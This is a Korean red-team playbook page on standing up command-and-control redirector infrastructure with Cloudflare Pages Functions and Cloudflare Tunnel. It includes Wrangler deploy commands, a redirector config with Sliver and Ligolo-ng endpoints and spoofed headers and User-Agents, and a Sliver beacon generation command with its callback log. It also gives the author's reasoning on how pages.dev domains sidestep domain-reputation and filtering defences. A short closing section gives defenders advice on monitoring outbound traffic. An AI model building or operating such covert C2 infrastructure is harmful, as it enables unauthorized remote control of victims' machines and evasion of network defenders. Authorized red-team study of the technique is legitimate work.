# Cloudflared Tunnel과 Pages

## 개념

<figure><img src="../.gitbook/assets/cloudflare-pages-rdr.png" alt=""><figcaption></figcaption></figure>

이전 페이지에서는 클라우드플레어 워커와 터널을 이용한 클라우드 공격자 인프라 구성에 대해서 알아봤다. 이번 페이지에서는 클라우드플레어 Pages Functions 기능을 활용해 워커 대신 리다이렉터를 생성하는 방법에 대해서 알아본다.

또한, 이번에는 수동으로 GUI를 사용하지 않고 Wrangler를 이용해 프로그래매틱하게 배포를 진행해본다.

## 클라우드플레어 페이지(Cloudflare Pages)

[클라우드플레어 페이지](https://developers.cloudflare.com/pages/)는 워커(Workers)와 비슷한 개념의 서버리스 컴퓨팅 서비스지만, 간단한 코드를 비롯해 JAM 스택 (Javascript, API, Markup) 기반의 웹 어플리케이션까지 지원하는 서비스다. 예를 들어 최근에 자주 쓰이는 React, SVelte, Next.JS 등의 프레임워크를 사용한 웹앱을 서버리스하게 운영하고 싶다면, 페이지를 사용하면 된다.

## 페이지 펑션(Cloudflare Pages Functions)

[페이지 펑션](https://developers.cloudflare.com/pages/functions/)은 페이지에서 풀스택 웹앱을 만들 수 있게 해주는 기능이다. 사용자 인증, Form submission, 미들웨어 등의 논리를 처리하는데 펑션이 사용된다. 웹 개발자가 아닌 레드팀의 입장에서 사실상 페이지 펑션은 워커(Worker)와 동일한 기능을 수행한다고 보면 된다.

파일 이름에 따라 routing이 정해지기 때문에 다음과 같은 디렉토리를 가지고 있다면:

```
./my-project 
  - index.html 
  - /public 
  - /functions 
    - myfunction.js
```

다음의 페이지를 방문할 때 `myfunction.js` 가 실행된다: `something.pages.dev/myfunction` . 이와 관련된 내용은 추후 인프라 구축 때 더 알아본다.

## 워커 vs. 페이지 펑션

리다이렉터로서 워커나 펑션은 모두 동일한 기능을 보여준다. 더 연구해보면 명확한 장단점이 나올수도 있겠지만, 적어도 개인적으로 공부한 내용에 따르자면 큰 차이는 없다. 다만 간단한 리다이렉터가 아니라 인증이나 미들웨어까지 포함한 완전한 기능을 갖춘 리다이렉터를 사용한다거나, 리다이렉터 뿐만 아니라 공격자 인프라로서 더 완전한 웹앱을 사용한다면 워커 보다는 페이지 펑션을 사용하는게 더 효율적일 것이다.

개인적으로 아직까지는 그냥 클라우드플레어를 이용한 리다이렉터의 옵션이 하나 늘어난 정도로 보고 있다.

## 트래픽 전송 단계

<figure><img src="../.gitbook/assets/cloudflare-pages-rdr (1).png" alt=""><figcaption></figcaption></figure>

모든 설정이 끝나면 공격자의 트래픽은 위 다이어그램 처럼 전송된다.

1. 에이전트) 페이지 펑션의 URL인 `<커스텀도메인>.pages.dev` 로 콜백한다.
2. 펑션) 들어오는 트래픽에 대해 HTTP 헤더, 헤더 값, User Agent등을 확인한다. 터널로 리다이렉트 하기 전 인증을 위해 서비스 토큰(CF-Access-Client-Id, CF-Access-Client-Secret)을 붙여 백엔드 터널로 보낸다.
   1. 펑션) C2 에이전트의 요청이라면 C2 터널로 리다이렉트 한다.
   2. (펑션) Ligolo-ng 의 요청이라면 Ligolo-ng 터널로 리다이렉트 한다.) - 다른 페이지에서 다룬다
3. 터널) 각 터널들은 서비스 토큰을 통해 인증을 확인한 뒤, 각 터널에 연결된 각 호스트들에게 트래픽을 보낸다. C2는 AWS에 있는 C2 서버의 127.0.0.1:443으로 보낸다.

## 인프라 구성 단계

먼저 페이지 펑션 리다이렉터를 구축해 워커와는 어떻게 다른지 알아본다. 그 뒤, Ligolo-ng용 터널을 따로 구축해본다.

1. 공격자 C2 서버, 도메인, Malleable C2, C2 서버로의 클라우드플레어 터널 연결
2. 페이지 펑션 구축

1번은 저번 페이지에서 이미 다뤘으니, 패스 한다. 이 페이지에서는 페이지 펑션 리다이렉터 구축에 대해 알아본다.

## 인프라 - 페이지 펑션 구축

저번 페이지에서 수동으로 워커를 구축해봤으니, 이번에는 Wrangler를 사용해 프로그래매틱하게 구축해본다.

1. 클라우드플레어 API와 소통하기 위한 CLI 프로그램으로 Wrangler를 설치한다. 설치 후 로그인한다.

```bash
sudo apt update -y 
sudo apt install npm nodejs -y 
npm install wrangler --save-dev 
npx wrangler login 
```

2. 페이지 펑션에 필요한 하드코딩 비밀들을 업데이트한다. 아래 두 파일의 첫 10줄 정도를 동일하게 업데이트 한다.&#x20;

* `./functions/index.js`
* `./functions/[[catchall]].js`

터널 URL, C2 HTTP 헤더/값, User Agent, CF-Access-Client-Id, CF-Access-Client-Secret 등을 업데이트 한다. 아래는 예시다.

<pre class="language-bash"><code class="lang-bash"><strong># git clone 
</strong><strong>cd /opt 
</strong>git clone https://github.com/ChoiSG/CloudflarePagesRedirector.git
cd ./CloudflarePagesRedirector

# index.js, [[catchall]].js 모두 동일하게 업데이트 
└─$ vim/emacs/nano/code/whatever... ./functions/index.js
└─$ vim/emacs/nano/code/whatever... './functions/[[catchall]].js'

# 예시 결과 
└─$ cat ./functions/index.js| head -10              
export async function onRequest(context) {
    // !! UPDATE ME !! - HARDCODED SECRETS. Use wrangler.toml if you prefer more opsec.
    const SLIVER_ENDPOINT = "https://resources-en.shealthinsurance.com";
    const LIGOLO_ENDPOINT = "https://resources-li.shealthinsurance.com";
    const SERVICE_CF_ID = "&#x3C;REDACTED>.access";
    const SERVICE_CF_SECRET = "&#x3C;REDACTED>";
    const SLIVER_HEADER_NAME = ["testo-XHeader", "redteam-Client"];
    const SLIVER_HEADER_VALUE = ["testov2", "v1.0.0"];
    const SLIVER_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.3339.396 Safari/537.36";
    const LIGOLO_UA = "ligolo-ua";

</code></pre>

**추가 설명 - index.js와 `[[catchall]].js`는 어떤 파일인가?**

리다이렉터 특성상 들어오는 요청의 URL 전체 (host, path, parameters, value)를 전달해야한다. 하지만 페이지 펑션의 Routing은 해당 펑션 이름을 기반으로 이뤄진다. 예를 들어 펑션 이름이 `myfunc.js`라면, `something.pages.dev/myfunc`로 들어오는 요청만 해당 펑션이 트리거된다.

하지만 대부분의 C2 트래픽은 URL을 모두 사용하는 경우가 많다. 예를 들자면 `https://redteam-playbook.pages.dev/environment.gitignore?_g=6_65p46268&c=p38y725080` 처럼 말이다. 심지어 뒤의 path, filename, parameters, values는 모두 랜덤으로 지정되는 경우도 존재한다.

때문에 이를 해결하려고 `index.js` 와 `[[catchall]].js` 이라는 특별한 Routing을 지원하는 펑션을 만들고, `_routes.json`을 만들어 페이지로 들어오는 모든 요청의 path/filename/parameter와 상관없이 리다이렉터 펑션(index/catchall)이 트리거 되도록 설정해놨다.

3. 배포한다.

```bash
└─$ npx wrangler pages deploy $PWD --project-name redteam-playbook --branch=main
✔ The project you specified does not exist: "redteam-playbook". Would you like to create it? › Create a new project
✔ Enter the production branch name: … main
✨ Successfully created the 'redteam-playbook' project.

✨ Uploading Functions bundle
✨ Uploading _routes.json
🌎 Deploying...
✨ Deployment complete! Take a peek over at https://8af14ac0.redteam-playbook.pages.dev
```

4. DNS Propagation이 끝났다면 리다이렉터를 이용한다.

* DNS Propagation은 약 5분 정도 걸린다.&#x20;

```bash
# 10초마다 DNS 확인하기  
$ watch -n 10 nslookup redteam-playbook.pages.dev

# Sliver v1.5.42 - 비컨 생성 (디버그 ON) 
sliver > generate beacon -S 5 -J 1 --debug -f exe -b https://redteam-playbook.pages.dev -s /tmp/pages-beacon.exe

# 실행 
PS C:\Users\Administrator\Downloads> .\pages-beacon.exe
[ . . . ] 
beacon.go:167: Beaconing -> https://redteam-playbook.pages.dev
httpclient.go:343: [http] POST -> https://redteam-playbook.pages.dev/environment.gitignore?_g=6_65p46268&c=p38y725080 (266 bytes)
httpclient.go:392: [http] New session id: 9dcd90539103f3a41be278a47163618a
sliver.go:178: Registering beacon with server
```

5. 코드 업데이트 후 재배포에는 동일한 wrangler 명령어를 사용한다.

```bash
npx wrangler pages deploy $PWD --project-name redteam-playbook --branch=main 
```

## 마치며

워커나 펑션 페이지를 이용하면 클라우드플레어의 `<커스텀도메인>.worker.dev` 혹은 `<커스텀도메인>.pages.dev` 을 이용해 C2 에이전트의 콜백을 받는 인프라를 간단하게 구성할 수 있다. 공격자의 입장에서는 도메인 신뢰도, 에이징, SEO, 스팸 필터, SSL/TLS 인증서 헌팅 등에 대해 거의 신경 쓸 필요가 없어지기 때문에 굉장히 편하다. 도메인 프론팅이나 리다이렉트에는 어쨌든 공격자의 CDN 및 도메인이 들어가기 마련인데, 위 방법의 경우는 그럴 필요가 없다.

방어자의 입장에서는 현재 환경에서 나가는 트래픽에 대해서 더 자세히 살펴봐야할 것이다. 우리 회사 특정 엔드포인트가 클라우드플레어 워커/페이지에 나름 일정한 주기로 계속해서 HTTP 요청/응답을 주고 받고 있다면, 충분히 의심스러운 상황이다. 아니면 아예 `worker.dev, pages.dev` 등의 도메인 자체를 블랙리스트 해버리는 경우도 있겠다.

물론 요즘 SaaS 및 서버리스 트렌드에 따라 더 많은 서비스들과 인터넷 트래픽이 더이상 커스텀 도메인을 사용하지 않고, 클라우드 회사들의 도메인을 사용하고 있기 때문에 블랙리스트는 좀 더 신중하게 해야할 것이다. 수 많은 클라우드 회사의 수 많은 서비스들을 일일히 찾아가며 별의별 도메인 (`worker.dev, pages.dev, azurewebsite.net, azureedge.net, azure-api.net, 등등등...)` 을 모두 차단해버린다면, 요즘날의 인터넷을 사용하거나, 이를 바탕으로 개발하는 것이 거의 불가능할지도 모르겠다 싶다.
